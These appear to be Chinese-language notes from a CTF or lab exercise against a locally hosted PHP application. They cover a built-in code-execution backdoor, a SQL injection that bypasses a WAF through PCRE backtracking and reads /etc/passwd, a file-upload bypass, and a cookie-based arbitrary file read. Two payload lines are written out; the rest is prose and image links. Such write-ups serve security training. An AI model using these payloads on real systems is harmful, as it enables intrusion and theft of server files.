### 自带后门

`http://127.0.0.1:8080/doAction.php?id=phpinfo();`

![image-20200609013952199](D:/Documents/个人笔记/Notes/images/image-20200609013952199.png)

### SQL注入+preg回溯绕过waf

`%'union/*".str_repeat('a',10000000)."*/SELECT 1,2,load_file('/etc/passwd') #`

过滤了union xxx select以及报错注入

![image-20200609012052223](D:/Documents/个人笔记/Notes/images/image-20200609012052223.png)

但是可以利用以下方法绕过waf

https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html

![image-20200609012201666](D:/Documents/个人笔记/Notes/images/image-20200609012201666.png)

### 后台任意文件上传

验证使用了黑名单和文件头，并且进行了重命名

![image-20200609010539060](D:/Documents/个人笔记/Notes/images/image-20200609010539060.png)

后台上传

![image-20200609010814954](D:/Documents/个人笔记/Notes/images/image-20200609010814954.png)

图片路径将在首页显示

![image-20200609010852405](D:/Documents/个人笔记/Notes/images/image-20200609010852405.png)

![image-20200609010904764](D:/Documents/个人笔记/Notes/images/image-20200609010904764.png)

### 任意文件读取

读取验证码的函数

![image-20200609013654465](D:/Documents/个人笔记/Notes/images/image-20200609013654465.png)

修改cookie

![image-20200609013707636](D:/Documents/个人笔记/Notes/images/image-20200609013707636.png)

![image-20200609013716981](D:/Documents/个人笔记/Notes/images/image-20200609013716981.png)